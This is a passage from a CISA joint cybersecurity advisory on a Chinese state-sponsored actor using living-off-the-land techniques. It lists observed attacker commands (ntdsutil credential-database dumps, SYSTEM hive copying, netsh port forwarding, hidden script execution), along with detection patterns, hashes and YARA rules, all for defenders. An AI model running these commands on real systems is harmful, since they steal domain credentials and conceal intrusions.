CVE\\-2021\\-27860\u2014FatPipe WARP, IPVPN, MPVPN.\n\t\t- [An APT Group Exploiting a 0\\-day in FatPipe WARP,](https://www.ic3.gov/Media/News/2021/211117-2.pdf) \n\t\t  \n\t\t\n\t\t[MPVPN, and IPVPN Software](https://www.ic3.gov/Media/News/2021/211117-2.pdf) \n\t\t .\n* Using webshells for persistence and exfiltration \\[\n [T1505\\.003](https://attack.mitre.org/versions/v13/techniques/T1505/003/) \n ], with at least some of the webshells derived from the\n *Awen* \n webshell.\n* Using compromised Small\\-Office Home\\-Office (SOHO) devices (e.g. routers) to obfuscate the source of the activity \\[\n [T1090\\.002](https://attack.mitre.org/versions/v13/techniques/T1090/002/) \n ].\n\t+ Most common types include ASUS, Cisco RV, Draytek Vigor, FatPipe IPVPN/MPVPN/WARP, Fortinet Fortigate, Netgear Prosafe, and Zyxel USG devices.\n\t+ Common CVEs for these devices and mitigation guidance can be found in the joint Cybersecurity Advisory,\n\t [Top CVEs Actively Exploited by People\u2019s Republic of China State\\-Sponsored Cyber Actors](https://media.defense.gov/2022/Oct/06/2003092365/-1/-1/0/Joint_CSA_Top_CVEs_Exploited_by_PRC_cyber_actors.PDF) \n\t .\n* Using living off the land tools for discovery, lateral movement, and collection activities, to include:\n\t+ certutil\n\t+ dnscmd\n\t+ ldifde\n\t+ makecab\n\t+ net user/group/use\n\t+ netsh\n\t+ nltest\n\t+ ntdsutil\n\t+ PowerShell\n\t+ req query/save\n\t+ systeminfo\n\t+ tasklist\n\t+ wevtutil\n\t+ wmic\n\t+ xcopy\n* Selective clearing of Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity \\[\n [T1070](https://attack.mitre.org/versions/v13/techniques/T1546) \n ].\n* Using open source \u201chacktools\u201d tools, such as:\n\t+ Fast Reverse Proxy (frp)\n\t\t- Probably derived from the publicly\\-available\n\t\t *fatedier* \n\t\t and\n\t\t *EarthWorm* \n\t\t variants.\n\t+ Impacket\n\t\t- To detect Impacket usage, see the joint Cybersecurity Advisory:\n\t\t [Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-277a) \n\t\t .\n\t+ Mimikatz.exe\n\t+ Remote administration tools\n\t\t- Defenders should consult the joint Cybersecurity Advisory:\n\t\t [Protecting Against Malicious Use of Remote Monitoring and Management Software](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a) \n\t\t .\n\n\n### *Command Execution*\n\n\n\n File names and directory paths used in these commands are only meant to serve as examples. Actual names and paths may differ depending on environment and activity, so defenders should account for variants when performing queries.\n \n\n\n\n**Note:** \n Many of the commands are derivatives of common system administration commands that could generate false positives when used alone without additional indicators.\n \n\n\n\n`7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z c:\\windows\\temp\\*` \n  \n\n`\"C:\\pstools\\psexec.exe\" \\\\{REDACTED} -s cmd /c \"cmd.exe /c \"netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999\"\"` \n  \n\n`C:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Desktop\\Win.exe` \n  \n\n`cmd.exe /C dir /S \\\\{REDACTED}\\c$\\Users\\{REDACTED} >> c:\\windows\\temp\\{REDACTED}.tmp` \n  \n\n`\"cmd.exe\" /c wmic process call create \"cmd.exe /c mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\McAfee_Logs\\\"` \n  \n\n`cmd.exe /Q /c *cd 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1` \n  \n\n`cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1652470932.9400265 2>&1` \n  \n\n`cmd.exe /Q /c net group \"domain admins\" /dom 1>\\\\127.0.0.1\\ADMIN$\\__<timestamp value> 2>&1 cmd.exe /Q /c wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\" \u00a01> \\\\127.0.0.1\\ADMIN$\\<timestamp value> \u00a02>&1` \n  \n\n`D:\\{REDACTED}\\xcopy C:\\windows\\temp\\hp d:\\{REDACTED} Get-EventLog security -instanceid 4624` \n  \n\n`ldifde.exe -f c:\\windows\\temp\\cisco_up.txt -p subtree` \n  \n\n`makecab ..\\backup\\210829-020000.zip ..\\webapps\\adssp\\html\\Lock.lic` \n  \n\n`move \"\\\\<redacted>\\c$\\users\\public\\Appfile\\registry\\SYSTEM\" ..\\backup\\210829-020000.zip` \n  \n\n`netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress={REDACTED} connectport=8443 protocol=tcp` \n  \n\n`netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999` \n  \n\n`Rar.exe a \u2013{REDACTED} c:\\Windows\\temp\\DMBC2C61.tmp` \n  \n\n`start-process -filepath c:\\windows\\temp\\<filename>.bat -windowstyle hidden 1` \n\n\n\n\n**Note:** \n The batch file in question (\n *\\<filename\\>* \n .bat) could use any name, and no discernable pattern has been determined at this time.\n \n\n\n\n`wmic process call create \"cmd.exe /c mkdir C:\\users\\public\\Appfile & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\users\\public\\Appfile\\\" q q` \n  \n\n`wmic process call create \"cmd.exe /c mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\tmp\\\"` \n  \n\n`wmic process call create \"cmd.exe /c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\Pro\"` \n  \n\n`wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full C:\\Windows\\Temp\\\"` \n\n\n\n#### *Command Line Patterns*\n\n\n\n Certain patterns in commands (with asterisks for wildcards) can be used to identify potentially malicious commands:\n \n\n\n* `cmd.exe /C dir /S \\\\* >> *`\n* `cmd.exe /Q /c * 1> \\\\127.0.0.1\\ADMIN$\\__*.*>&1`\n* `powershell start-process -filepath c:\\windows\\temp\\*.exe -windowstyle hidden`\n\n\n#### *File Paths*\n\n\n\n The most common paths where files and executables used by the actor have been found include:\n \n\n\n* `C:\\Users\\Public\\Appfile` \n (including subdirectories)\n* `C:\\Perflogs` \n (including subdirectories)\n* `C:\\Windows\\Temp` \n (including subdirectories)\n\n\n#### *File Names*\n\n\n\n The file names the actor has previously used for such things as malware, scripts, and tools include:\n \n\n\n\n\n| backup.bat | cl64\\.exe | update.bat | Win.exe |\n| --- | --- | --- | --- |\n| billagent.exe | nc.exe | update.exe | WmiPrvSE.exe |\n| billaudit.exe | rar.exe | vm3dservice.exe | WmiPreSV.exe |\n| cisco\\_up.exe | SMSvcService.exe | watchdogd.exe |  |\n\n\n\n In addition to the file names and paths above, malicious files names, believed to be randomly created, in the following format have also been discovered:\n `C:\\Windows\\[a-zA-Z]{8}.exe` \n\n\n\n#### *SHA\\-256 File Hashes*\n\n\n* `f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd`\n* `ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31`\n* `d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca`\n* `472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d`\n* `66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7`\n* `3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71`\n* `41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597`\n* `c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99`\n* `3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f`\n* `fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15`\n* `ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484`\n\n\n#### *User\\-agent*\n\n\n\n In some cases, the following user\\-agent string (including the extra spacing) was identified performing reconnaissance activities by this actor:\n \n\n\n\n`Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0) \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 Gecko/20100101 Firefox/68.0` \n\n\n\n\n**Note:** \n The spacing between \u201c)\u201d and \u201cGecko\u201d is 3 tabs followed by 4 spaces.\n \n\n\n#### *Yara rules*\n\n\n\n\n| `rule ShellJSP {`   `strings:`   `$s1 = \"decrypt(fpath)\"`   `$s2 = \"decrypt(fcontext)\"`   `$s3 = \"decrypt(commandEnc)\"`   `$s4 = \"upload failed!\"`   `$s5 = \"aes.encrypt(allStr)\"`   `$s6 = \"newid\"`   `condition:`   `filesize < 50KB and 4 of them`   `}` |\n| --- |\n\n\n\n\n| `rule EncryptJSP {`   `strings:`   `$s1 = \"AEScrypt\"`   `$s2 = \"AES/CBC/PKCS5Padding\"`   `$s3 = \"SecretKeySpec\"`   `$s4 = \"FileOutputStream\"`   `$s5 = \"getParameter\"`   `$s6 = \"new ProcessBuilder\"`   `$s7 = \"new BufferedReader\"`   `$s8 = \"readLine()\"`   `condition:`   `filesize < 50KB and 6 of them`   `}` |\n| --- |\n\n\n\n\n| `rule CustomFRPClient {`   `meta:`   `description=\u201dIdentify instances of the actor's custom FRP tool based`   `on unique strings chosen by the actor and included in the tool\u201d`   `strings:`   `$s1 = \"%!PS-Adobe-\" nocase ascii wide`   `$s2 = \"github.com/fatedier/frp/cmd/frpc\" nocase ascii wide`   `$s3 = \"github.com/fatedier/frp/cmd/frpc/sub.startService\" nocase`   `ascii wide`   `$s4 = \"MAGA2024!!!\" nocase ascii wide`   `$s5 = \"HTTP_PROXYHost: %s\" nocase ascii wide`   `condition:`   `all of them`   `}` |\n| --- |\n\n\n\n\n| `rule HACKTOOL_FRPClient {`   `meta:`   `description=\u201dIdentify instances of FRP tool (Note: This tool is`   `known to be used by multiple actors, so hits would not necessarily imply`   `activity by the specific actor described in this report)\u201d`   `strings:`   `$s1 = \"%!PS-Adobe-\" nocase ascii wide`   `$s2 = \"github.com/fatedier/frp/cmd/frpc\" nocase ascii wide`   `$s3 = \"github.com/fatedier/frp/cmd/frpc/sub.startService\" nocase`   `ascii wide`   `$s4 = \"HTTP_PROXYHost: %s\" nocase ascii wide`   `condition:`   `3 of them`   `}` |\n| --- |\n\n\n### References\n\n\n\n Active Directory and domain controller hardening:\n \n\n\n* Best practices:\n [Best Practices for Securing Active Directory \\| Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory) \n .\n\n\n\n CISA regional cyber threats:\n \n\n\n* PRC state\\-sponsored activity:\n [China Cyber Threat Overview and Advisories](https://www.cisa.gov/china) \n .\n\n\n\n Microsoft Threat Intelligence blog:\n \n\n\n* Volt Typhoon activity:\n [Volt Typhoon targets US critical infrastructure with living\\-off\\-the\\-land techniques \\| Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/) \n .\n\n\n\n Ntdsutil.exe:\n \n\n\n* Overview:\n [Ntdsutil \\| Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)) \n .\n\n\n\n PowerShell:\n \n\n\n* Best practices:\n [Keeping PowerShell: Security Measures to Use and Embrace](https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF) \n .\n* Logging configuration:\n [Greater Visibility Through PowerShell Logging \\| Mandiant \\| Google Cloud Blog](https://cloud.google.com/blog/topics/threat-intelligence/greater-visibility/) \n .\n\n\n\n Windows command line process auditing:\n \n\n\n* Overview:\n [Command line process auditing \\| Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing) \n .\n\n\n\n Windows Defender Firewall:\n \n\n\n* Best practices:\n [Configure firewall rules with group policy \\- Windows Security \\| Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/configure) \n .\n* Logging configuration:\n [Configure Windows Firewall logging \\- Windows Security \\| Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/configure-logging?tabs=intune) \n .\n\n\n\n Windows management instrumentation:\n \n\n\n* Events:\n [Tracing WMI Activity \\- Win32 apps \\| Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmi-activity#obtaining-wmi-events-through-event-viewer) \n .\n* Tracing activity:\n [Tracing WMI Activity \\- Win32 apps \\| Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/wmisdk/tracing-wmi-activity)\n\n\n\n Windows password spraying:\n \n\n\n* Logging and playbook configuration:\n [Password spray investigation \\| Microsoft Learn](https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-password-spray) \n .\n\n\n### Acknowledgements\n\n\n\n The NSA Cybersecurity Collaboration Center, along with the authoring agencies, acknowledge Amazon Web Services (AWS) Security, Broadcom, Cisco Talos, Google's Threat Analysis Group, Lumen Technologies, Mandiant, Microsoft Threat Intelligence (MSTI), Palo Alto Networks, SecureWorks, SentinelOne, Trellix, and additional industry partners for their collaboration on this advisory.\n \n\n\n#### ***Disclaimer of Endorsement***\n\n\n\n The information and opinions contained in this document are provided \"as is\" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise does not constitute or imply its endorsement, recommendation, or favoring by the authoring agencies' governments, and this guidance shall not be used for advertising or product endorsement purposes.\n \n\n\n#### ***Trademark Recognition***\n\n\n\n Active Directory\n \u00ae \n , Microsoft\n \u00ae \n , PowerShell\n \u00ae \n , and Windows\n \u00ae \n are registered trademarks of Microsoft Corporation.\u00a0MITRE\n \u00ae \n and ATT\\&CK\n \u00ae \n are registered trademarks of The MITRE Corporation.\n \n\n\n#### ***Purpose***\n\n\n\n This document was developed in furtherance of the authoring agencies\u2019 cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.\n \n\n\n#### ***Contact***\n\n\n\n**U.S. organizations:** \n Urgently report any anomalous activity or incidents, including based upon technical information associated with this Cybersecurity Advisory, to CISA at\n [Report@cisa.dhs.gov](mailto:Report@cisa.dhs.gov) \n\n or\n [cisa.gov/report](https://www.cisa.gov/report) \n\n or to the FBI via your local FBI field office listed at\n [https://www.fbi.gov/contact\\-us/field\\-offices](https://www.fbi.gov/contact-us/field-offices) \n**.** \n\n\n\n\n NSA Cybersecurity Report Questions and Feedback:\n \n[CybersecurityReports@nsa.gov](mailto:CybersecurityReports@nsa.gov) \n\n\n\n\n NSA Defense Industrial Base Inquiries and Cybersecurity Services:\n \n[DIB\\_Defense@cyber.nsa.gov](mailto:DIB_Defense@cyber.nsa.gov) \n\n\n\n\n NSA Media Inquiries / Press Desk: 443\\-634\\-0721,\n \n[MediaRelations@nsa.gov](mailto:MediaRelations@nsa.gov) \n\n\n\n\n**Australian organizations:** \n Visit\n [cyber.gov.au](https://cyber.gov.au) \n or call 1300 292 371 (1300 CYBER 1\\) to report cybersecurity incidents and to access alerts and advisories.\n \n\n\n\n**Canadian organizations:** \n Report incidents by emailing CCCS at\n \n[contact@cyber.gc.ca](mailto:contact@cyber.gc.ca) \n**.** \n\n\n\n\n**New Zealand organizations:** \n Report cyber security incidents to\n [incidents@ncsc.govt.nz](mailto:incidents@ncsc.govt.nz) \n or call 04 498 7654\\.\n \n\n\n\n**United Kingdom organizations:** \n Report a significant cyber security incident at\n [ncsc.gov.uk/report\\-an\\-incident](https://ncsc.gov.uk/report-an-incident) \n (monitored 24 hours) or, for urgent assistance, call 03000 200 973\\.\n \n\n\n### Appendix: MITRE ATT\\&CK Techniques\n\n\n\n The below tables capture all referenced threat actor tactics and techniques in this advisory.\n \n\n\n\n\n| **Initial Access** |  |  |\n| --- | --- | --- |\n| **Technique Title** | **ID** | **Use** |\n| Exploit Public\\-facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | Actor used public\\-facing applications to gain initial access to systems; in this case, Earthworm and PortProxy. |\n\n\n\n\n| **Execution** |  |  |\n| --- | --- | --- |\n| **Technique Title** | **ID** | **Use** |\n| Windows Management Instrumentation | [T1047](https://attack.mitre.org/techniques/T1047/) | The actor executed WMIC commands to create a copy of the SYSTEM registry. |\n| Command and Scripting Interpreter: PowerShell | [T1059\\.001](https://attack.mitre.org/techniques/T1059/001/) | The actor used a PowerShell command to identify successful logons to the host. |\n| Command and Scripting Interpreter: Windows Command Shell | [T1059\\.003](https://attack.mitre.org/techniques/T1059/003/) | The actor used this primary command prompt to execute a query that collected information about the storage devices on the local host. |\n\n\n\n\n| **Persistence** |  |  |\n| --- | --- | --- |\n| **Technique Title** | **ID** | **Use** |\n| Server Software Component: Web Shell | [T1505\\.003](https://attack.mitre.org/techniques/T1505/003/) | The actor used backdoor web servers with web shells to establish persistence to systems, including some of the webshells being derived from  *Awen*   webshell. |\n\n\n\n\n| **Defense Evasion** |  |  |\n| --- | --- | --- |\n| **Technique Title** | **ID** | **Use** |\n| Indicator Removal | [T1070](https://attack.mitre.org/techniques/T1546) | The actor selectively cleared Windows Event Logs, system logs, and other technical artifacts to remove evidence of their intrusion activity. |\n| Indicator Removal: Clear Windows Event Logs | [T1070\\.001](https://attack.mitre.org/techniques/T1070/001/) | The actor cleared system event logs to hide activity of an intrusion. |\n\n\n\n\n| **Credential Access** |  |  |\n| --- | --- | --- |\n| **Technique Title** | **ID** | **Use** |\n| OS Credential Dumping: NTDS | [T1003\\.003](https://attack.mitre.org/techniques/T1003/003/) | The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive out of the network to perform password cracking. |\n| Brute Force | [T1110](https://attack.mitre.org/techniques/T1110/) | The actor attempted to gain access to accounts with multiple password attempts. |\n| Brute Force: Password Spraying | [T1110\\.003](https://attack.mitre.org/techniques/T1110/003/) | The actor used commonly used passwords against accounts to attempt to acquire valid credentials. |\n| OS Credential Dumping | [T1003](https://attack.mitre.org/techniques/T1003/) | The actor used additional commands to obtain credentials in the environment. |\n| Credentials from Password Stores | [T1555](https://attack.mitre.org/techniques/T1555/) | The actors searched for common password storage locations. |\n\n\n\n\n| **Discovery** |  |  |\n| --- | --- | --- |\n| **Technique Title** | **ID** | **Use** |\n| System Information Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | The actors executed commands to gather information about local drives. |\n| System Owner/User Discovery | [T1033](https://attack.mitre.org/techniques/T1033/) | The actors gathered information about successful logons to the host using a PowerShell command. |\n| Permission Groups Discovery: Local Groups | [T1069\\.001](https://attack.mitre.org/techniques/T1069/001/) | The actors attempt to find local system groups and permission settings. |\n| Permission Groups Discovery: Doman Groups | [T1069\\.002](https://attack.mitre.org/techniques/T1069/002/) | The actors used commands to enumerate the active directory structure. |\n| System Network Configuration Discovery | [T1016](https://attack.mitre.org/techniques/T1016/) | The actors used commands to enumerate the network topology. |\n\n\n\n\n| **Command and Control** |  |  |\n| --- | --- | --- |\n| **Technique Title** | **ID** | **Use** |\n| Proxy | [T1090](https://attack.mitre.org/techniques/T1090/) | The actors used commands to enable port forwarding on the host. |\n| Proxy: External Proxy | [T1090\\.002](https://attack.mitre.org/techniques/T1090/002/) | The actors used compromised SOHO devices (e.g. routers) to obfuscate the source of their activity. |\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n This product is provided subject to this\n [Notification](/notification \"Follow link\") \n and this\n [Privacy \\& Use](/privacy-policy \"Follow link\") \n policy.\n \n\n\n\n\n\n\n\n\n\n\n\n### Tags\n\n\n\n\n Topics\n \n\n[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories) \n ,\n [Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience) \n\n\n\n\n MITRE ATT\\&CK TTP\n \n\n Brute Force (T1110\\), Command and Control (TA0011\\), Credential Access (TA0006\\), Defense Evasion (TA0005\\), Discovery (TA0007\\), Execution (TA0002\\), Initial Access (TA0001\\), Persistence (TA0003\\), Privilege Escalation (TA0004\\)\n \n\n\n\n Co\\-Sealers and Partners\n \n\n Federal Bureau of Investigation, Five Eyes\n \n\n\n\n Nation\\-State Actor\n \n\n China\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease share your thoughts\n--------------------------\n\n\n\n We recently updated our anonymous\n [product survey](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a) \n ; we\u2019d welcome your feedback.\n \n\n\n\n\n\n\n\n\n\n\n\n\nRelated Advisories\n------------------\n\n\n\n\n\n\n\n\n\n\n Jul 11, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-193A\n \n\n### [CISA Red Team\u2019s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense\\-in\\-Depth](/news-events/cybersecurity-advisories/aa24-193a)\n\n\n\n\n\n\n\n\n\n\n\n Jul 08, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-190A\n \n\n### [People\u2019s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action](/news-events/cybersecurity-advisories/aa24-190a)\n\n\n\n\n\n\n\n\n\n\n\n May 10, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-131A\n \n\n### [\\#StopRansomware: Black Basta](/news-events/cybersecurity-advisories/aa24-131a)\n\n\n\n\n\n\n\n\n\n\n\n Apr 18, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-109A\n \n\n### [\\#StopRansomware: Akira Ransomware](/news-events/cybersecurity-advisories/aa24-109a)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Return to top](#) \n\n\n\n\n* [Topics](/topics)\n* [Spotlight](/spotlight)\n* [Resources \\& Tools](/resources-tools)\n* [News \\& Events](/news-events)\n* [Careers](/careers)\n* [About](/about)\n\n\n\n\n\n\n\n\n[Cybersecurity \\& Infrastructure Security Agency](/ \"Go to the Cybersecurity & Infrastructure Security Agency homepage\")\n\n\n* [Facebook](https://www.facebook.com/CISA)\n* [Twitter](https://twitter.com/CISAgov)\n* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)\n* [YouTube](https://www.youtube.com/@cisagov)\n* [Instagram](https://www.instagram.com/cisagov)\n* [RSS](/subscribe-updates-cisa)\n\n\n\n\n CISA Central\n \n[1\\-844\\-Say\\-CISA](tel:1-844-Say-CISA) \n[SayCISA@cisa.gov](mailto:SayCISA@cisa.gov) \n\n\n\n\n\n\n\n\n\n\n\n DHS Seal\n \n\n\n CISA.gov\n \n\n An official website of the U.S. Department of Homeland Security\n \n\n\n* [About CISA](/about \"About CISA\")\n* [Budget and Performance](https://www.dhs.gov/performance-financial-reports \"Budget and Performance\")\n* [DHS.gov](https://www.dhs.gov \"Department of Homeland Security\")\n* [Equal Opportunity \\& Accessibility](/oedia \"Equal Opportunity & Accessibility\")\n* [FOIA Requests](https://www.dhs.gov/foia \"FOIA Requests\")\n* [No FEAR Act](/no-fear-act \"No FEAR Act Reporting\")\n* [Office of Inspector General](https://www.oig.dhs.gov/ \"Office of Inspector General\")\n* [Privacy Policy](/privacy-policy \"Privacy Policy\")\n* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 \"Subscribe to Email Updates\")\n* [The White House](https://www.whitehouse.gov/ \"The White House\")\n* [USA.gov](https://www.usa.gov/ \"USA.gov\")\n* [Website Feedback](/forms/feedback \"Website Feedback\")\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "cves": ["CVE-2021-40539", "CVE-2021-27860"], "techniques": ["T1069.001", "T1059.003", "T1090.002", "T1070.001", "T1505.003", "T1003.003", "T1110.003", "T1069.002", "T1059.001"], "advisory": "aa23-144a", "title": "People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection | CISA", "source": "cybersecurity-advisories", "id": "9202a3bde3a94d4ca8e246ea2566d783e58a303b71741a99392a00edb10d44fb"}